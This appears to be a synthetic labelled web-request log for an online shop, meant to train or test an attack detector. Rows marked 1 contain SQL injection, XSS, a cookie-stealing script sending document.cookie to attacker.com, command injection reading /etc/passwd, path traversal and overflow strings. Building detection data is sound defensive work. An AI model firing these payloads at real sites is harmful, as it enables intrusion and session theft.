timestamp,ip,method,path,payload,label
08:01:24.9,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
08:01:26.8,192.168.1.165,GET,/category/Iphone,,0
08:01:29.6,203.162.4.191,GET,/search?q=<script>alert('XSS')</script>,,1
08:01:31.0,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
08:01:33.3,10.0.0.82,GET,/order/myorders,,0
08:01:35.4,103.75.118.228,GET,/product/1' AND 1=1,,1
08:01:37.4,192.168.1.162,POST,/auth/login,"{'csrf_token': 'ImydaH7Jag6cxQzzsnYxUdys2iexVcm8DBZJgZF4eG'.vHzTeRIy.mZ3wahiLrxrAooUxsxV-S0N6zpq9, 'username': 'user20', 'password': '8dR^essM^*A1', 'submit': 'Log in'}",0
08:01:39.3,103.75.118.228,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
08:01:41.1,192.168.1.55,POST,/auth/register,"{'csrf_token': 'Im2l1ofMgIrlDVUao5PaqHrh0NNuXyew4Q9yNrQedQ'.YO2FCwJ7.sPIN4he93cqRj3uTgqss9dXMjNmf, 'username': 'newuser2', 'email': 'a41@b.com', 'password': '0ZS&^nlQZ#*n', 'submit': 'Register'}",0
08:01:42.9,10.0.0.79,POST,/search,{'query': 'iphone 15 pro max'},0
08:01:45.2,10.0.0.146,GET,/order/cart,,0
08:01:46.9,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
08:01:49.3,192.168.1.141,GET,/auth/logout,,0
08:01:51.0,103.75.118.228,GET,/search?q=<script>alert('XSS')</script>,,1
08:01:52.8,192.168.1.151,GET,/order/myorders,,0
08:01:54.9,192.168.1.55,POST,/auth/register,"{'csrf_token': 'ImEVuTKmRax5eOKx6ZnJmwni83wVMv6GezW0sHiNXw'.8e609MSc.bK9qDLxEk0d-0qOn1eUF3ivOSnhh, 'username': 'newuser49', 'email': 'a7@b.com', 'password': 'TFtnacK3wBp3', 'submit': 'Register'}",0
08:01:57.2,203.162.4.190,POST,/auth/login,"{'csrf_token': 'Imys19FFUBYjDOLDLeHE0zKnvsoMXs4wuYNMvYPoiU'.hCiX2O9r.SdZRmDRglN1nXIRlgsdvB6_V9Et9, 'username': 'user26', 'password': 'E^OiOuq5lD(x', 'submit': 'Log in'}",0
08:01:58.8,203.162.4.191,POST,/auth/register,"{'csrf_token': 'ImhKPncFYqv1oXGgoBxasZ7QW5cS7HNC2AzA9d5iRs'.X74Q8AhC.aUdYWbgRUoWrQDyj-luFmX2Qafs6, 'username': 'newuser9', 'email': 'a54@b.com', 'password': '%zkBzAODhp16', 'submit': 'Register'}",0
08:02:00.9,192.168.1.56,GET,/order/myorders,,0
08:02:02.8,203.162.4.191,GET,/product/1' AND 1=1,,1
08:02:05.6,192.168.1.169,GET,/category/Iphone,,0
08:02:07.0,10.0.0.195,GET,/product/1,,0
08:02:09.1,192.168.1.46,POST,/auth/login,"{'csrf_token': 'ImP9o7YqZYh1EseygWR6IrbyefnkWUwo5yFY4jYNH0'.00Ln6hGA.ABsrlCHKuHmXZYLuG_XGS0DTEq96, 'username': 'user57', 'password': '!g&ztjTQ)q^O', 'submit': 'Log in'}",0
08:02:11.2,192.168.1.182,GET,/,,0
08:02:12.7,192.168.1.167,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
08:02:14.9,192.168.1.175,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
08:02:17.5,103.75.118.228,GET,/product/1' AND 1=1,,1
08:02:19.5,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
08:02:21.3,192.168.1.56,POST,/auth/register,"{'csrf_token': 'Imk8RCsdp3WSHkdCKlVj6gI7CpvDP7e03kMoezz6gg'.fDFJkoGO.L2IEv6nXmP2HaOYifIFRZ322SJld, 'username': 'newuser74', 'email': 'a35@b.com', 'password': '$TRAsXO%X699', 'submit': 'Register'}",0
08:02:22.8,10.0.0.176,GET,/order/cart,,0
08:02:25.1,203.162.4.191,GET,/product/1' AND 1=1,,1
08:02:26.9,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
08:02:29.6,192.168.1.167,POST,/search,{'query': 'iphone 15 pro max'},0
08:02:31.0,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
08:02:33.2,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
08:02:35.2,10.0.0.82,POST,/search,{'query': 'iphone 15 pro max'},0
08:02:37.3,103.75.118.228,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
08:02:39.0,203.162.4.191,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
08:02:41.7,192.168.1.169,POST,/auth/login,"{'csrf_token': 'Im7PcUdC7OXsp8jlZo49Ng4TcP82mBb4kOA5OtbEhZ'.cUM2f8Is.FOg5aIUn5A8Msg8fN7FD4AphkYkM, 'username': 'user47', 'password': 'Umpx(V$Eohjb', 'submit': 'Log in'}",0
08:02:43.0,10.0.0.67,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
08:02:45.6,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
08:02:47.3,192.168.1.182,POST,/search,{'query': 'iphone 15 pro max'},0
08:02:48.9,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
08:02:51.0,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
08:02:53.4,10.0.0.82,GET,/auth/login,,0
08:02:55.0,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
08:02:57.6,192.168.1.175,GET,/auth/register,,0
08:02:59.0,10.0.0.195,GET,/product/1,,0
08:03:01.7,203.162.4.190,POST,/search,{'query': 'product; cat /etc/passwd'},1
08:03:03.5,192.168.1.141,POST,/auth/register,"{'csrf_token': 'Im7xQY64ZnAzbjeL8EyVLLOQ9IIbMb6hpupovDfD1o'.5RsKbShy.98wGt1DkxEYEmVOozOEL-r1S8SgA, 'username': 'newuser14', 'email': 'a35@b.com', 'password': '!AYCGg5VfcAG', 'submit': 'Register'}",0
08:03:04.9,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
08:03:07.2,10.0.0.195,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
08:03:08.9,192.168.1.141,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
08:03:11.3,192.168.1.182,GET,/,,0
08:03:13.0,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
08:03:14.8,192.168.1.22,GET,/product/2,,0
08:03:16.9,192.168.1.50,GET,/order/cart,,0
08:03:19.0,10.0.0.195,POST,/auth/login,"{'csrf_token': 'Imwk4a2XPicPHmfJZjrdw0fIUHu7TRptalJvbGzrzk'.yso2wVoT.0wVZwUeC3QI1rfsOlT8U-5-MoR8a, 'username': 'user84', 'password': 'WVbjSFzYOe!8', 'submit': 'Log in'}",0
08:03:21.0,192.168.1.197,POST,/auth/login,"{'csrf_token': 'ImFqT1JcVMGsg94GL22wHvt7EBWcJraSo5tLy7nBz5'.ex5jJkjh.Vm0jNVwL9WwRPfWn0vaNVkq7fg5r, 'username': 'user37', 'password': 'SVQwh^blGCSq', 'submit': 'Log in'}",0
08:03:23.0,203.162.4.190,POST,/search,{'query': 'product; cat /etc/passwd'},1
08:03:24.9,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
08:03:27.1,203.162.4.190,POST,/search,{'query': 'product; cat /etc/passwd'},1
08:03:29.5,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
08:03:31.7,203.162.4.191,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
08:03:32.8,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
08:03:35.6,103.75.118.228,GET,/search?q=<script>alert('XSS')</script>,,1
08:03:37.3,192.168.1.12,GET,/order/myorders,,0
08:03:39.3,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
08:03:41.3,192.168.1.185,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
08:03:43.0,192.168.1.46,POST,/auth/register,"{'csrf_token': 'Imd1NjbFZ1Muy9dVxPqbjGt5ZpRhRw7e2QWm1pNMXM'.AfmrokZ5.e5-savMbmA0O93_10-nzX74ssT2j, 'username': 'newuser84', 'email': 'a6@b.com', 'password': 'sx5V*OZWgA2S', 'submit': 'Register'}",0
08:03:45.7,10.0.0.66,GET,/auth/register,,0
08:03:47.7,103.75.118.228,GET,/../../../../etc/passwd,,1
08:03:49.6,103.75.118.228,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
08:03:51.3,192.168.1.28,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
08:03:53.5,10.0.0.79,GET,/auth/logout,,0
08:03:54.9,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
08:03:57.3,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
08:03:59.2,192.168.1.55,GET,/order/cart,,0
08:04:01.7,203.162.4.191,GET,/product/1' AND 1=1,,1
08:04:03.3,192.168.1.12,GET,/order/myorders,,0
08:04:05.7,10.0.0.28,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
08:04:07.2,103.75.118.228,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
08:04:09.2,192.168.1.144,POST,/search,{'query': 'iphone 15 pro max'},0
08:04:11.1,192.168.1.169,GET,/category/Iphone,,0
08:04:13.0,103.75.118.228,GET,/search?q=' OR 1=1; --,,1
08:04:15.1,127.0.0.1,POST,/auth/login,"{'csrf_token': 'Im1SbloUSNVJ1V9MNbcyWNhTbc2V99GG70KBmHbb6L'.pM67wi7N.4aqhNWDTqh3uXxmBPayvF-J-0IDE, 'username': 'user58', 'password': 't^S6W4vLXQdW', 'submit': 'Log in'}",0
08:04:16.8,192.168.1.182,POST,/search,{'query': 'iphone 15 pro max'},0
08:04:19.1,10.0.0.106,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
08:04:21.4,192.168.1.165,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
08:04:23.1,10.0.0.28,GET,/auth/login,,0
08:04:24.8,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
08:04:27.3,192.168.1.197,GET,/product/1,,0
08:04:29.3,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
08:04:31.0,192.168.1.22,GET,/order/myorders,,0
08:04:33.0,192.168.1.104,GET,/order/cart,,0
08:04:35.1,10.0.0.67,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
08:04:37.6,192.168.1.167,POST,/search,{'query': 'iphone 15 pro max'},0
08:04:39.1,192.168.1.197,GET,/order/myorders,,0
08:04:41.2,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
08:04:43.1,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
08:04:45.5,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
08:04:47.4,127.0.0.1,GET,/product/1,,0
08:04:49.4,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
08:04:51.3,10.0.0.79,POST,/search,{'query': 'iphone 15 pro max'},0
08:04:53.5,10.0.0.15,GET,/order/myorders,,0
08:04:54.9,103.75.118.228,GET,/../../../../etc/passwd,,1
08:04:57.6,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
08:04:59.0,203.162.4.191,GET,/product/1' AND 1=1,,1
08:05:01.1,203.162.4.190,POST,/search,{'query': 'product; cat /etc/passwd'},1
08:05:03.7,10.0.0.146,GET,/order/myorders,,0
08:05:05.4,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
08:05:07.7,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
08:05:09.3,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
08:05:11.2,192.168.1.56,GET,/order/myorders,,0
08:05:13.1,10.0.0.146,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
08:05:14.9,203.162.4.190,GET,/../../../../etc/passwd,,1
08:05:16.9,203.162.4.191,GET,/search?q=<script>alert('XSS')</script>,,1
08:05:19.1,192.168.1.55,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
08:05:21.4,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
08:05:23.0,10.0.0.67,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
08:05:25.6,192.168.1.141,GET,/product/2,,0
08:05:26.9,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
08:05:29.3,103.75.118.228,GET,/product/1' AND 1=1,,1
08:05:30.9,203.162.4.191,GET,/auth/register,,0
08:05:32.9,192.168.1.55,POST,/auth/register,"{'csrf_token': 'ImG3MUdaGb4ux77HBxruRZhHNwBBmTpDVaz8b1VWuS'.I8wazxZ8.UOGFmIAUrB_ePQF789QaQyP9SFOs, 'username': 'newuser18', 'email': 'a68@b.com', 'password': '9U2SfRzZS@iL', 'submit': 'Register'}",0
08:05:35.4,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
08:05:37.6,192.168.1.28,GET,/category/Iphone,,0
08:05:39.4,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
08:05:40.8,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
08:05:42.8,103.75.118.228,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
08:05:45.7,192.168.1.22,GET,/,,0
08:05:47.4,192.168.1.151,GET,/order/myorders,,0
08:05:48.8,192.168.1.165,POST,/auth/register,"{'csrf_token': 'Iml5ctqsCTMZlvwldNeXvqSSKR8fI95pvbLSKAcG1l'.wDHFTjQN.GPITgSrnqmX3Ow7GCVwTNPFLpQT0, 'username': 'newuser14', 'email': 'a20@b.com', 'password': '3jurq1$h5GA7', 'submit': 'Register'}",0
08:05:51.4,192.168.1.55,POST,/auth/login,"{'csrf_token': 'ImX9PiV1DIe2Tzf4WWPgclvXCR0GVNRCMmxTKt9fvp'.Es6xvBZ7.zv7rsGYyFx72KxSs0SypBanoQtw5, 'username': 'user35', 'password': 'ziudtyxHTKnQ', 'submit': 'Log in'}",0
08:05:53.6,192.168.1.144,GET,/product/2,,0
08:05:54.8,10.0.0.176,GET,/auth/register,,0
08:05:57.1,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
08:05:59.1,192.168.1.104,GET,/product/2,,0
08:06:01.7,192.168.1.55,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
08:06:03.3,10.0.0.67,GET,/product/1,,0
08:06:04.9,10.0.0.82,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
08:06:07.6,10.0.0.82,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
08:06:09.7,192.168.1.169,POST,/search,{'query': 'iphone 15 pro max'},0
08:06:11.1,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
08:06:13.1,10.0.0.106,GET,/order/myorders,,0
08:06:15.0,10.0.0.82,POST,/auth/login,"{'csrf_token': 'ImHKHSUozQqJRQv0mhGddZTdTUpNAzyodV7PFp5Pzy'.U9tys7nx.ubJEyXhXltCAjyPXaqWCxyOiqsa0, 'username': 'user10', 'password': 'KFnKtbS!qrq5', 'submit': 'Log in'}",0
08:06:17.5,103.75.118.228,GET,/product/1' AND 1=1,,1
08:06:19.6,10.0.0.66,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
08:06:20.8,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
08:06:23.4,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
08:06:25.3,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
08:06:27.5,192.168.1.144,GET,/product/2,,0
08:06:29.0,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
08:06:31.5,192.168.1.141,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
08:06:33.6,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
08:06:35.3,203.162.4.190,GET,/product/1' AND 1=1,,1
08:06:37.1,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
08:06:39.4,203.162.4.191,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
08:06:40.9,192.168.1.28,GET,/order/cart,,0
08:06:43.6,192.168.1.50,POST,/search,{'query': 'iphone 15 pro max'},0
08:06:44.8,203.162.4.191,GET,/order/myorders,,0
08:06:47.1,10.0.0.176,GET,/auth/register,,0
08:06:49.5,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
08:06:51.5,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
08:06:53.4,192.168.1.197,GET,/auth/register,,0
08:06:55.0,192.168.1.165,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
08:06:57.1,203.162.4.191,GET,/product/2,,0
08:06:58.8,10.0.0.146,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
08:07:01.4,10.0.0.28,POST,/search,{'query': 'iphone 15 pro max'},0
08:07:03.3,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
08:07:05.6,10.0.0.176,POST,/auth/login,"{'csrf_token': 'Im8SJwGw8p15gLGaDk1bnj2sbo82RUQE2SpTULEwF4'.MThLWZbq.vynBzVgtHXWUfRwh_G5equuQPs-d, 'username': 'user90', 'password': 'nD(N0w8Oc)w7', 'submit': 'Log in'}",0
08:07:07.6,192.168.1.185,GET,/product/2,,0
08:07:09.7,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
08:07:11.1,10.0.0.67,POST,/auth/register,"{'csrf_token': 'ImJddnu4VMOBzz4IhVV4lrblC5gvmhP2WdgTkTGCCl'.siq8lbLi.QvpbY_XrGaofU-Z3g7L302fY9Si-, 'username': 'newuser23', 'email': 'a20@b.com', 'password': '(KIN4Uh)#ZhL', 'submit': 'Register'}",0
08:07:13.2,192.168.1.175,GET,/product/1,,0
08:07:15.6,192.168.1.12,POST,/search,{'query': 'iphone 15 pro max'},0
08:07:17.3,192.168.1.169,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
08:07:19.5,103.75.118.228,GET,/../../../../etc/passwd,,1
